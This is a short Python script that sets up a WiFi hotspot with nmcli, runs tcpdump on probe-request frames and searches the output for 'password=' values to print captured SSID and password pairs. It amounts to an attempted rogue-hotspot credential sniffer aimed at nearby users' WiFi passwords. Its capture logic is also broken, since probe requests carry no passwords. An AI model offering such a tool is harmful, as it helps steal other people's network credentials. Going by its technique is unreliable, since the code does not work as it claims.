import subprocess
import re
import time

def create_wifi_hotspot(ssid, password):
    try:
        # Configure the WiFi hotspot
        subprocess.run(['nmcli', 'device', 'wifi', 'hotspot', 'ssid', ssid, 'password', password])
        print(f"WiFi hotspot '{ssid}' created with password '{password}'")
    except Exception as e:
        print(f"Failed to create WiFi hotspot: {e}")

def monitor_wifi(interface):
    try:
        # Run tcpdump to capture WiFi traffic
        process = subprocess.Popen(['tcpdump', '-i', interface, 'subtype', 'probe-req'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)

        print("Monitoring WiFi for connection attempts...")

        # Parse captured packets
        for line in iter(process.stdout.readline, ''):
            # Extract SSID from probe request
            match = re.search(r'SSID: "(.*)"', line)
            if match:
                ssid = match.group(1)

                # Extract password from captured packets
                match = re.search(r'password=(\w+)', line)
                if match:
                    password = match.group(1)
                    print(f"SSID: {ssid}, Password: {password}")

    except KeyboardInterrupt:
        print("\nExiting...")

def main():
    ssid = "MyWiFiHotspot"
    password = "MyPassword"
    wifi_interface = "wlan0"  # Replace with your WiFi interface name

    try:
        # Loop to continuously create and monitor WiFi hotspots
        while True:
            # Create WiFi hotspot
            create_wifi_hotspot(ssid, password)
            
            # Monitor WiFi for connection attempts
            monitor_wifi(wifi_interface)

            # Wait for some time before creating the next hotspot
            time.sleep(30)  # Adjust the time interval as needed
    except KeyboardInterrupt:
        print("\nExiting...")

if __name__ == "__main__":
    main()
